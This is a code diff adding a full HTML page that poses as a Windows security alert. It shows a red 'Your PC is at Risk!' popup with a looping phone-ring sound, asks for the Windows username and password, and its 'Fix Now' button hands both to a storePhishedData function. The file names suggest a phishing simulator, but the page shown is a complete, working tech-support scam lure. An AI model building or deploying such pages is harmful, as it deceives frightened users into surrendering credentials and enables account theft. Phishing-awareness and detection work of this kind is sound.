@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Security Alert</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #000;
+      font-family: 'Segoe UI', sans-serif;
+      overflow: hidden;
+    }
+    .popup {
+      position: absolute;
+      top: 10%;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 450px;
+      background-color: #fff3cd;
+      color: #842029;
+      padding: 25px;
+      border: 4px solid #ff0000;
+      border-radius: 10px;
+      box-shadow: 0 0 25px red;
+      z-index: 999;
+    }
+    h2 {
+      margin-top: 0;
+    }
+    button {
+      padding: 10px 15px;
+      background-color: #dc2626;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 5px;
+      border: 1px solid #999;
+    }
+    #bg-audio {
+      position: absolute;
+      top: -1000px;
+    }
+  </style>
+</head>
+<body>
+  <div class="popup">
+    <h2>⚠️ Your PC is at Risk!</h2>
+    <p>Suspicious activity detected. Your passwords, files, and personal info might be compromised!</p>
+    <p>Enter your Windows credentials below to verify your identity and secure your system:</p>
+    <input type="text" id="winUser" placeholder="Windows Username">
+    <input type="password" id="winPass" placeholder="Windows Password">
+    <button onclick="fakeFixNow()">Fix Now</button>
+  </div>
+
+  <audio autoplay loop id="bg-audio">
+    <source src="https://www.soundjay.com/phone/sounds/telephone-ring-04a.mp3" type="audio/mpeg">
+  </audio>
+
+  <script src="simulator.js"></script>
+  <script>
+    function fakeFixNow() {
+      const username = document.getElementById('winUser').value;
+      const password = document.getElementById('winPass').value;
+      storePhishedData(username, password, 'Tech Support');
+    }
+  </script>
+</body>
+</html>
